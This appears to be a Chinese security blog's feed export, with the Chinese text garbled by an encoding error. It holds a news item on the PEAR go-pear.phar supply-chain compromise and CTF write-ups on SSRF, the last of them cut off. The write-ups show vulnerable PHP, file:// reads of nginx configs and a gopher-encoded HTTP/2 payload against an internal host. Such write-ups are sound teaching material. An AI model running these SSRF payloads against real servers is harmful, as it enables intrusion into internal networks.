pearweb_pharsï¼‰</code>è·å–ç›¸åŒå‘è¡Œç‰ˆæœ¬çš„æ–°å‰¯æœ¬å¹¶æ¯”è¾ƒå…¶æ–‡ä»¶å“ˆå¸Œå€¼ã€‚å¦‚æœä¸åŒï¼Œæ‚¨å¯èƒ½ä¼šæœ‰å®‰è£…å—æ„ŸæŸ“çš„æ–‡ä»¶çš„é£é™©â€ï¼ŒPEARå®˜æ–¹ç½‘ç«™ä¸Šçš„è¯´æ˜å¦‚ä¸Šã€‚</p></blockquote><p>æ ¹æ®PEARç»´æŠ¤äººå‘˜çš„è¯´æ³•ï¼Œè¯¥å›¢é˜Ÿç›®å‰æ­£åœ¨è¿›è¡Œè¿½è¸ªã€æº¯æºè°ƒæŸ¥ï¼Œä»¥ç¡®å®šæ”»å‡»çš„ç¨‹åº¦ä»¥åŠæ”»å‡»è€…æ˜¯å¦‚ä½•åœ¨è¿™ä¹ˆæ—©çš„æ—¶æœŸå°±èƒ½å¤Ÿæ”»ç ´æœåŠ¡å™¨ã€‚</p><p>è€Œç°åœ¨å¯ä»¥åœ¨Githubä¸Šè·å–åˆ°å‡€åŒ–åçš„ç‰ˆæœ¬<code>pearweb_phars-1.10.10</code>ï¼Œæ­¤å‰åœ¨æœåŠ¡å™¨<code>httpï¼š//pear.php.net</code>ä¸Šå—åˆ°æ±¡æŸ“çš„ç‰ˆæœ¬æ˜¯<code>v1.10.9</code>ï¼ŒPEARå›¢é˜Ÿä¹Ÿé‡æ–°å‘å¸ƒäº†æœªå—æ±¡æŸ“çš„<code>go-pear.phar-v1.10.9</code>ï¼Œå¹¶ä¸”ä¼šåŒ…å«æœ‰æ¯ä¸ªä¸åŒ<code>phar</code>çš„å•ç‹¬GPGç­¾åæ–‡ä»¶ï¼Œç”¨ä»¥éªŒæ˜å…¶æ­£ç¡®æ€§ã€‚</p><p>åæ¥å¼€å‘äººå‘˜è¿›è¡Œäº†è¿›ä¸€æ­¥çš„é€šçŸ¥è¯´æ˜ï¼Œè¯å®åªæœ‰<code>http://pear.php.net</code>æœåŠ¡å™¨ä¸Šçš„å‰¯æœ¬å—åˆ°äº†å½±å“ï¼Œè€Œä¸”<code>go-pear.phar</code>çš„GitHubå‰¯æœ¬å¹¶æ²¡æœ‰æ›¿æ¢ä¸ºæ±¡æŸ“åçš„æ–‡ä»¶ã€‚</p><p>å› æ­¤æ‰€æœ‰åœ¨è¿‡å»å…­ä¸ªæœˆå†…ä»å®˜æ–¹ç½‘ç«™ä¸‹è½½è¿‡å®‰è£…æ–‡ä»¶<code>go-pear.phar</code>çš„PHP / PEARç”¨æˆ·<strong>éƒ½åº”è¯¥è®¤è¯†</strong>åˆ°è‡ªå·±æœ‰è¢«é»‘å®¢ä¾µå®³çš„é£é™©ï¼Œå¹¶ä¸”æœ€å¥½æ›¿æ¢æ–‡ä»¶ä¸ºGithubä¸Šçš„çº¯å‡€ç‰ˆæœ¬ã€‚</p><h2 id="PEAR-å›¢é˜Ÿé’ˆå¯¹æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“çš„éƒ¨åˆ†è°ƒæŸ¥ä¿¡æ¯"><a href="#PEAR-å›¢é˜Ÿé’ˆå¯¹æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“çš„éƒ¨åˆ†è°ƒæŸ¥ä¿¡æ¯" class="headerlink" title="PEAR å›¢é˜Ÿé’ˆå¯¹æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“çš„éƒ¨åˆ†è°ƒæŸ¥ä¿¡æ¯"></a>PEAR å›¢é˜Ÿé’ˆå¯¹æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“çš„éƒ¨åˆ†è°ƒæŸ¥ä¿¡æ¯</h2><p><strong>æ›´æ–°</strong> -  PEARå›¢é˜Ÿå‘å¸ƒäº†æœ‰å…³æœ€è¿‘å®‰å…¨äº‹ä»¶çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè§£é‡Šäº†åœ¨2018å¹´12æœˆ20æ—¥æœ€åä¸€æ¬¡æ­£å¼æ–‡ä»¶å‘å¸ƒåï¼Œå…¶æœåŠ¡å™¨ä¸Šå‘ç°<code>go-pear.phar</code>è¢«æ±¡æŸ“çš„è¯¦ç»†çŠ¶å†µã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130111806.png" alt=""></p><p>PEAR å›¢é˜Ÿåœ¨åˆ†æäº†åŒ…ç®¡ç†å™¨çš„æ±¡æŸ“ç‰ˆæœ¬æ–‡ä»¶ä¹‹åï¼Œå‘ç°æ¶æ„ä»£ç æ¨¡å—<code>é€šè¿‡Perlå‘IP 104.131.154.154ç”Ÿæˆåå‘shell</code>ï¼Œè¿™æ„å‘³ç€å—æ„ŸæŸ“çš„æœåŠ¡å™¨å°†ç”Ÿæˆåé—¨ï¼Œå…è®¸æ”»å‡»è€…å®Œå…¨æ§åˆ¶å®ƒä»¬ï¼ŒåŒ…æ‹¬å®‰è£…åº”ç”¨ç¨‹åºï¼Œè¿è¡Œæ¶æ„ä»£ç ï¼Œçªƒå–æ•æ„Ÿæ•°æ®çš„èƒ½åŠ›ã€‚</p><p>æ ¹æ®<a href="https://blog.dcso.de/php-pear-software-supply-chain-attack/" target="_blank" rel="noopener">DCSOä¸Šå¾·å›½ç½‘ç»œå®‰å…¨ç»„ç»‡å¯¹æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“çš„åˆ†ææŠ¥å‘Š</a>å¾—çŸ¥ï¼šæœåŠ¡å™¨IPåœ°å€<code>104.131.154.154</code>æŒ‡å‘ä¸€ä¸ªwebåŸŸå<code>bestlinuxgames [.] com</code>ï¼Œè¯¥æœåŠ¡å™¨è¢«è®¤ä¸ºæ˜¯é»‘å®¢ä½¿ç”¨çš„ä¸€å°å—æ„ŸæŸ“åä¸»æœºï¼ˆè‚‰é¸¡/C2æœåŠ¡å™¨ï¼‰ã€‚</p><blockquote><p>â€œè¯¥IPå·²è¢«è¯å®ä¸æ­¤æ¬¡ä¾›åº”é“¾æ±¡æŸ“æœ‰å…³ï¼Œä½†æ²¡æœ‰å‘ç°å…¶ä»–è¿è§„è¡Œä¸ºã€‚<code>install-pear-nozlib.phar</code>è½¯ä»¶åŒ…æ˜¯æ­£å¸¸çš„ï¼ŒGitHubä¸Šçš„<code>go-pear.phar</code>æ–‡ä»¶ä¹Ÿæ˜¯æ­£å¸¸çš„ï¼Œå¯ä»¥å°†ä»»ä½•å¯ç–‘çš„æ ·æœ¬å“ˆå¸Œä¸æ­£ç¡®çš„MD5å€¼è¿›è¡Œæ ¡éªŒã€‚â€ï¼›</p><p>â€œå› æ­¤ï¼Œå‡å¦‚æ‚¨åœ¨12/20ä¹‹å‰ä¸‹è½½äº†<code>go-pear.phar</code>ç”¨ä»¥åœ¨æ‚¨çš„ç³»ç»Ÿä¸Šå®‰è£…PEARåŒ…ï¼Œé‚£ä¹ˆæ‚¨<strong>åº”è¯¥æ‹…å¿ƒ</strong>è‡ªå·±æ˜¯å¦ä¼šæˆä¸ºè‚‰é¸¡ï¼Œç‰¹åˆ«æ˜¯å½“æ‚¨çš„ç³»ç»Ÿå…·æœ‰å¯ç”¨çš„<code>sh</code>å’Œ<code>perl</code>çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å…·ä½“è¯æ®å»ç¡®è®¤æ‚¨æ˜¯å¦ä¸‹è½½äº†è¢«æ„ŸæŸ“çš„æ–‡ä»¶ï¼Œä½†ä¿é™©èµ·è§è¿˜æ˜¯å¸Œæœ›æ‚¨èƒ½å¥½å¥½æ£€æŸ¥ä¸€ä¸‹æ‚¨çš„ç³»ç»Ÿã€‚â€ï¼›</p><p>â€œå¦å¤–è¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ä¼šæ±¡æŸ“ä½¿ç”¨PEARå®‰è£…çš„ç¨‹åºåŒ…â€¦å®ƒæ±¡æŸ“çš„æ˜¯åˆå§‹å®‰è£…PEARå®‰è£…ç¨‹åºçš„<code>go-pear.phar</code>å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå³ä½¿ç”¨<code>pear</code>å‘½ä»¤å®‰è£…çš„å„ç§PEARåŒ…<strong>ä¸å—</strong>å½±å“ã€‚â€ï¼›</p><p>PEAR å›¢é˜Ÿåœ¨ä¸€ç³»åˆ—æ¨æ–‡ä¸­çš„è¡¨ç¤ºå¦‚ä¸Šã€‚</p></blockquote><p>PSï¼šå½“ä»Šçš„ä¾›åº”é“¾æ±¡æŸ“äº‹ä»¶è¶Šæ¥è¶Šå¤šï¼Œè°¨æ…å°å¿ƒæ–¹èƒ½é©¶å¾—ä¸‡å¹´èˆ¹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> è¯‘æ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> èµ„è®¯ </tag>
            
            <tag> è¯‘æ–‡ </tag>
            
            <tag> ç½‘ç»œå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ssrf_by_http2_and_gopher</title>
      <link href="/2019/01/31/ssrf-by-http2-and-gopher/"/>
      <url>/2019/01/31/ssrf-by-http2-and-gopher/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="pwnhub-pink-friend"><a href="#pwnhub-pink-friend" class="headerlink" title="pwnhub-pink-friend"></a>pwnhub-pink-friend</h1><blockquote><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/" target="_blank" rel="noopener">http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/</a></p><p><a href="https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html" target="_blank" rel="noopener">https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html</a></p></blockquote><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://40.73.33.181/index.php" target="_blank" rel="noopener">https://40.73.33.181/index.php</a></p><p>source code:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Can not parse url: '</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span> <span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>å…ˆssrfè¯»nginxé…ç½®æ–‡ä»¶ï¼š</p><ul><li>/etc/nginx/nginx.conf</li><li>/etc/nginx/sites-enabled/default</li><li>/var/log/nginx/access.log;</li><li>/var/log/nginx/error.log</li></ul><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/sites-enabled/default</code></p><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/nginx.conf</code></p><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">user</span> www<span class="token operator">-</span>data<span class="token punctuation">;</span><span class="token keyword">worker_processes</span> auto<span class="token punctuation">;</span><span class="token keyword">pid</span> <span class="token operator">/</span>run<span class="token operator">/</span>nginx<span class="token punctuation">.</span><span class="token keyword">pid</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>modules<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span><span class="token keyword">events</span> <span class="token punctuation">{</span>    <span class="token keyword">worker_connections</span> <span class="token number">768</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># multi_accept on;</span><span class="token punctuation">}</span><span class="token keyword">http</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Basic Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">sendfile</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nopush</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nodelay</span> on<span class="token punctuation">;</span>    <span class="token keyword">keepalive_timeout</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token keyword">types_hash_max_size</span> <span class="token number">2048</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># server_tokens off;</span>    <span class="token comment" spellcheck="true"># server_names_hash_bucket_size 64;</span>    <span class="token comment" spellcheck="true"># server_name_in_redirect off;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>mime<span class="token punctuation">.</span><span class="token keyword">types</span><span class="token punctuation">;</span>    <span class="token keyword">default_type</span> application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># SSL Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">ssl_protocols</span> TLSv1 TLSv1<span class="token number">.1</span> TLSv1<span class="token number">.2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># Dropping SSLv3, ref: POODLE</span>    <span class="token keyword">ssl_prefer_server_ciphers</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Logging Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">access_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token keyword">error_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Gzip Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">gzip</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># gzip_vary on;</span>    <span class="token comment" spellcheck="true"># gzip_proxied any;</span>    <span class="token comment" spellcheck="true"># gzip_comp_level 6;</span>    <span class="token comment" spellcheck="true"># gzip_buffers 16 8k;</span>    <span class="token comment" spellcheck="true"># gzip_http_version 1.1;</span>    <span class="token comment" spellcheck="true"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Virtual Host Configs</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>sites<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#server {</span>    <span class="token comment" spellcheck="true">#    listen 8080</span>    <span class="token comment" spellcheck="true">#    location /flag {</span>    <span class="token comment" spellcheck="true">#        proxy_pass 172.20.0.3:8080</span>    <span class="token comment" spellcheck="true">#    }</span>    <span class="token comment" spellcheck="true">#}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#mail {</span><span class="token comment" spellcheck="true">#    # See sample authentication script at:</span><span class="token comment" spellcheck="true">#    # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    # auth_http localhost/auth.php;</span><span class="token comment" spellcheck="true">#    # pop3_capabilities "TOP" "USER";</span><span class="token comment" spellcheck="true">#    # imap_capabilities "IMAP4rev1" "UIDPLUS";</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:110;</span><span class="token comment" spellcheck="true">#        protocol   pop3;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:143;</span><span class="token comment" spellcheck="true">#        protocol   imap;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true">#}</span></code></pre><p>ç„¶åå¯ä»¥ä»nginx.confå¾—çŸ¥flagçº¿ç´¢<code>172.20.0.3:8080</code>ï¼Œé€šè¿‡gopheråè®®æ„é€ ç¬¦åˆHTTP2çš„payloadè®¿é—®æŒ‡å®šåœ°å€ï¼Œè·å–è¿”å›çš„HTTP2çš„åŸç”Ÿæ•°æ®ï¼ˆéœ€è¦äº†è§£<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">HTTP2</a>ä»¥åŠ<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">gopheråè®®</a>çš„çŸ¥è¯†ï¼‰ã€‚</p><pre class=" language-payload"><code class="language-payload">--payload:/index.php?url=gopher://172.20.0.3:8080/_PRI%2520%252A%2520HTTP/2.0%250D%250A%250D%250ASM%250D%250A%250D%250A%2500%2500%2500%2504%2500%2500%2500%2500%2500%2500%2500%2515%2501%2505%2500%2500%2500%2501%2582%2586%2584A%258A%2508%259D%255C%250B%2581p%25DCx%250F%2503%2560%2581%25EFS%2581%25F9</code></pre><p>è¿”å›çš„æ•°æ®:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190131000835.png" alt=""></p><p>å¯ä»¥å°†è¿”å›çš„æ•°æ®æŒ‰HTTP2åè®®çš„æ ¼å¼è§£æï¼Œæˆ–è€…åˆ©ç”¨ä¸€ç§å·§å¦™çš„æ–¹æ³•ï¼Œå³æŠŠè¿”å›æ•°æ®æ”¾åœ¨ä½¿ç”¨socketæ¨¡æ‹Ÿçš„æœåŠ¡å™¨ä¸Šï¼Œç›´æ¥ç”¨<code>curl --http2-prior-knowledge</code>è®¿é—®ï¼Œè·å¾—å†™åœ¨è¿”å›å¤´éƒ¨<code>set-cookie</code>çš„flagï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token comment" spellcheck="true"># From F1sh's blog</span><span class="token keyword">import</span> socketa <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"response.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>host <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>port <span class="token operator">=</span> <span class="token number">2333</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'è¿æ¥åœ°å€ï¼š'</span><span class="token punctuation">,</span> addr    c<span class="token punctuation">.</span>send<span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><p>æ‰§è¡Œ<code>curl -vv --http2-prior-knowledge 127.0.0.1:6777 --output -</code>è¿”å›çš„æ•°æ®ï¼š</p><pre class=" language-response"><code class="language-response">* Rebuilt URL to: 127.0.0.1:6777/*   Trying 127.0.0.1...* TCP_NODELAY set* Connected to 127.0.0.1 (127.0.0.1) port 6777 (#0)* Using HTTP2, server supports multi-use* Connection state changed (HTTP/2 confirmed)* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0* Using Stream ID: 1 (easy handle 0x55d0f3f35520)> GET / HTTP/2> Host: 127.0.0.1:6777> User-Agent: curl/7.61.0> Accept: */*> * Connection state changed (MAX_CONCURRENT_STREAMS == 128)!< HTTP/2 200 < server: nginx/1.14.0 (Ubuntu)< date: Wed, 30 Jan 2019 16:02:53 GMT< content-type: text/html; charset=UTF-8< set-cookie: F1ag:flag{Http2_Mak3_a_Differ3nce}=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0< * Closing connection 0U hav3 g0t Me!!!%                  </code></pre><p>[+] GET==&gt; F1ag:flag{Http2_Mak3_a_Differ3nce}</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œå®‰å…¨ </tag>
            
            <tag> ssrf </tag>
            
            <tag> write-up </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æŸå…¥ç¾¤é¢˜è§£é¢˜è®°å½•</title>
      <link href="/2019/01/29/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/01/29/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="è®°æŸå…¥ç¾¤é¢˜è§£é¢˜è¿‡ç¨‹"><a href="#è®°æŸå…¥ç¾¤é¢˜è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è®°æŸå…¥ç¾¤é¢˜è§£é¢˜è¿‡ç¨‹"></a>è®°æŸå…¥ç¾¤é¢˜è§£é¢˜è¿‡ç¨‹</h1><p>é—²æ¥æ— äº‹ï¼Œçœ‹ä¼—äººçº·çº·åœ¨ç©å…¥ç¾¤é¢˜ï¼Œçºµä½¿æˆ‘èœçš„ä¸æ•¢åŠ¨æ‰‹ï¼Œä¹Ÿæƒ³å°è¯•ä¸€ä¸‹ã€‚</p><h2 id="0x01-è¿é¢è€Œæ¥çš„SSRF"><a href="#0x01-è¿é¢è€Œæ¥çš„SSRF" class="headerlink" title="0x01 è¿é¢è€Œæ¥çš„SSRF"></a>0x01 è¿é¢è€Œæ¥çš„SSRF</h2><p>é¦–å…ˆè®¿é—®é¢˜ç›®åœ°å€ï¼š</p><p><code>index.phpæºç </code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">try</span>     <span class="token punctuation">{</span>         <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">24</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">20</span> <span class="token operator">||</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">></span><span class="token operator">></span><span class="token number">16</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token variable">$url</span><span class="token punctuation">.</span><span class="token string">' is inner ip'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$result_info</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>           